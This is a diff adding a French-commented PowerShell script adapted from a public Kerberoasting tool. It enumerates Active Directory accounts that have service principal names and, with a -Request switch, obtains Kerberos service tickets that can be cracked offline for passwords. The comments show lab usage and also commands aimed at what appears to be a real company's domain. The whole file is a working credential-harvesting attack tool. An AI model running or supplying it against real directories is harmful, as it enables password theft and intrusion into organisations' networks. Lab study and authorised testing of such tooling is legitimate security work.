@@ -1,0 +1,132 @@
+# Script repris de https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
+# Modif par HB le 09/03/2004 : ajout de commentaires pour le comprendre et savoir l'utiliser de manière ciblée
+# Testé en Lab Windows 2022 Server (RDP-2022 + DC-2022)
+# A renommer en .ps1 avant utilisation
+
+# Ce script utilise la classe "DirectorySearcher" (Namespace: System.DirectoryServices) :
+# https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher
+
+# Exemple d'utilisation permettant de découvrir les objets de l'AD de Lab (DC-2022), situés sous le noeud "OU=test,DC=cybersoc,DC=lab",
+# avec la cde suivante lancée depuis le serveur de Lab RDP-2022, inclus dans le domaine "DC=cybersoc,DC=lab"
+# PS C:\Users\kiki\Desktop> C:\Users\kiki\Desktop\GetUserSPNs-HBR.ps1 -GCName "OU=test,DC=cybersoc,DC=lab"
+# =>
+# On boucle sur chacun des noeuds à scanner :
+# OU=test,DC=cybersoc,DC=lab
+#
+# ServicePrincipalName : HOST/WEB-SERVER-01
+# Name                 : kiki
+# SAMAccountName       : kiki
+# MemberOf             : CN=gpr_kiki,OU=test,DC=cybersoc,DC=lab
+# PasswordLastSet      : 3/9/2024 3:20:29 PM
+
+# On peut ensuite requêter un TGS pour le service de SPN "HOST/WEB-SERVER-01" avec la cde suivante :
+# C:\Users\kiki\Desktop> C:\Users\kiki\Desktop\GetUserSPNs-HBR.ps1 -GCName "OU=test,DC=cybersoc,DC=lab" -Request
+
+# Usage chez MAC :
+# PS C:\Users\kiki\Desktop>
+# C:\Users\kiki\Desktop\GetUserSPNs-HBR.ps1 -GCName "CN=Users,DC=groupe,DC=ad,DC=macif,DC=fr"
+# puis:
+# C:\Users\kiki\Desktop>
+# klist purge
+# PS C:\Users\kiki\Desktop>
+# C:\Users\kiki\Desktop\GetUserSPNs-HBR.ps1 -GCName "CN=Users,DC=groupe,DC=ad,DC=macif,DC=fr" -Request
+
+
+[CmdletBinding()]
+Param(
+  [Parameter(Mandatory=$False,Position=1)] [string]$GCName,
+  [Parameter(Mandatory=$False)] [string]$Filter,
+  [Parameter(Mandatory=$False)] [switch]$Request,
+  [Parameter(Mandatory=$False)] [switch]$UniqueAccounts
+)
+
+Add-Type -AssemblyName System.IdentityModel
+
+$GCs = @()
+
+If ($GCName) {
+  # Si on a spécifié par exemple le noeud à scanner, avec l'option : -GCName "OU=test,DC=cybersoc,DC=lab"
+  $GCs += $GCName
+} else { # find them
+  $ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+  $CurrentGCs = $ForestInfo.FindAllGlobalCatalogs()
+  # 2 lignes suivantes rajoutées par HB
+  Write-Host "CurrentGCs="
+  $CurrentGCs
+  ForEach ($GC in $CurrentGCs) {
+    #$GCs += $GC.Name
+    $GCs += $ForestInfo.ApplicationPartitions[0].SecurityReferenceDomain
+    # 3 lignes suivantes rajoutées par HB
+    Write-Host "Voici le noeud à scanner, cad GCs="
+    $GCs
+    Write-Host ""
+  }
+}
+
+if (-not $GCs) {
+  # no Global Catalogs Found
+  Write-Host "No Global Catalogs Found!"
+  Exit
+}
+
+<# 
+en commentaires
+#>
+
+
+ForEach ($GC in $GCs) {
+    Write-Host "On boucle sur chacun des noeuds à scanner :"
+    $GC
+
+    # On instancie un objet "DirectorySearcher" pour rechercher et exécuter des requêtes sur une hiérarchie de services
+    # de domaine Active Directory à l'aide du protocole LDAP  de domaine Active Directory à l'aide du protocole LDAP
+    $searcher = New-Object System.DirectoryServices.DirectorySearcher   # Instanciation de l'objet 
+    $searcher.SearchRoot = "LDAP://" + $GC                              # par exemple : LDAP://OU=test,DC=cybersoc,DC=lab
+    $searcher.PageSize = 1000
+    $searcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))" # Exclure de la recherche les objets de type "computer"
+    $searcher.Filter = "(&(!objectClass=computer))" # Rechercher les objets de l'AD non "computer"
+    $searcher.PropertiesToLoad.Add("serviceprincipalname") | Out-Null # |Out-Null sert à envoyer la sortie vers Null, évitant un affichage
+    $searcher.PropertiesToLoad.Add("name") | Out-Null
+    $searcher.PropertiesToLoad.Add("samaccountname") | Out-Null
+    #$searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null
+    #$searcher.PropertiesToLoad.Add("displayname") | Out-Null
+    $searcher.PropertiesToLoad.Add("memberof") | Out-Null
+    $searcher.PropertiesToLoad.Add("pwdlastset") | Out-Null
+    # On décommente la ligne suivante :
+    $searcher.PropertiesToLoad.Add("distinguishedname") | Out-Null
+
+    $searcher.SearchScope = "Subtree"
+
+    $results = $searcher.FindAll()
+    
+    [System.Collections.ArrayList]$accounts = @()
+        
+    foreach ($result in $results) {
+        foreach ($spn in $result.Properties["serviceprincipalname"]) {
+            $o = Select-Object -InputObject $result -Property `
+                @{Name="ServicePrincipalName"; Expression={$spn.ToString()} }, `
+                @{Name="Name";                 Expression={$result.Properties["name"][0].ToString()} }, `
+                #@{Name="UserPrincipalName";   Expression={$result.Properties["userprincipalname"][0].ToString()} }, `
+                @{Name="SAMAccountName";       Expression={$result.Properties["samaccountname"][0].ToString()} }, `
+                #@{Name="DisplayName";         Expression={$result.Properties["displayname"][0].ToString()} }, `
+                @{Name="MemberOf";             Expression={$result.Properties["memberof"][0].ToString()} }, `
+                @{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} }, `
+                # ligne suivante decommentée par HB
+                @{Name="DistinguishedName";    Expression={$result.Properties["distinguishedname"][0].ToString()} } #, `
+            if ($UniqueAccounts) {
+                if (-not $accounts.Contains($result.Properties["samaccountname"][0].ToString())) {
+                    $accounts.Add($result.Properties["samaccountname"][0].ToString()) | Out-Null
+                    $o
+                    if ($Request) {
+                        New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString() | Out-Null
+                    }
+                }
+            } else {
+                $o
+                if ($Request) {
+                    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString() | Out-Null
+                }
+            }
+        }
+    }
+}
